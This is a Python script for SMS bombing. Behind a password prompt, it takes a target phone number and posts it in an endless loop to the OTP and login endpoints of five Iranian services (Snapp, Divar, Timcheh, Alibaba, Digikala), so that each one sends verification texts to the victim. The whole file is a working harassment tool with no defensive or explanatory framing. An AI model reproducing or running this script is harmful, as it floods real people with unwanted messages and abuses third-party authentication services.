import requests
import time
import colorama
colorama.init()


url_divar = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
url_snapp = "https://api.divar.ir/v5/auth/authenticate"
url_timche = "https://api.timcheh.com/auth/otp/send"
url_alibaba = " https://ws.alibaba.ir/api/v3/account/mobile/otp"
url_digikala = " https://api.digikala.com/v1/user/authenticate/"


pas = input("Enter Script Password: ")
if pas == "K.T.K.Z.A":
    print(colorama.Fore.GREEN+"True Password, Done...")
    time.sleep(4)
    for i in range(1000):
        print("")
    


    soal = input(colorama.Fore.YELLOW+"Enter Target Phone Number: ")


    while True: 

#Snappppppppppppppp
        py_divar = {"cellphone": soal}
        sms_divar = requests.post(url_divar, json=py_divar)
        stat_divar = sms_divar.status_code
        
        if stat_divar == 200:
            print(colorama.Fore.GREEN+"[+]"+colorama.Fore.WHITE+"Message Sended Succes From Snapp")
        else:
            print(colorama.Fore.RED+"[-]"+colorama.Fore.WHITE+"Message Not Sended Succes From Snapp")


#Divarrrrrrrrrrrrrrr
        py_snapp = {"phone":soal}
        sms_snapp = requests.post(url_snapp, json=py_snapp)
        stat_snapp = sms_snapp.status_code
        if stat_snapp == 200:
            print(colorama.Fore.GREEN+"[+]"+colorama.Fore.WHITE+"Message Sended Succes From Divar")
        else:
            print(colorama.Fore.RED+"[-]"+colorama.Fore.WHITE+"Message Not Sended Succes From Divar")




#Timcheeeeeeeeeeeee

        py_timche = {"mobile":soal}
        sms_timche = requests.post(url_timche, json=py_timche)
        stat_timche = sms_timche.status_code
        if stat_timche == 200:
            print(colorama.Fore.GREEN+"[+]"+colorama.Fore.WHITE+"Message Sended Succes From Timche")
        else:
            print(colorama.Fore.RED+"[-]"+colorama.Fore.WHITE+"Message Not Sended Succes From Timche")


#AliBabaaaaaaaaaaaaaaaa
        py_alibaba = {"phoneNumber":soal}
        sms_alib = requests.post(url_alibaba,json=py_alibaba)
        stat_alibaba = sms_alib.status_code
        if stat_alibaba == 200:
            print(colorama.Fore.GREEN+"[+]"+colorama.Fore.WHITE+"Message Sended Succes From Alibaba")
        else:
            print(colorama.Fore.RED+"[-]"+colorama.Fore.WHITE+"Message Not Sended Succes From Alibaba")


#DigiKalaaaaaaaaaaaaaaa
      
        py_digikala = {"username":soal}
        sms_digikala = requests.post(url_digikala, json=py_digikala)
        stat_digikala = sms_digikala.status_code
        if stat_digikala == 200:
            print(colorama.Fore.GREEN+"[+]"+colorama.Fore.WHITE+"Message Sended Succes From Digikala")
        else:
            print(colorama.Fore.RED+"[-]"+colorama.Fore.WHITE+"Message Not Sended Succes From Digikala")




else:
    for i in range(1000):
        print("")
    print(colorama.Fore.RED+"Wrong Password Please Try Again")
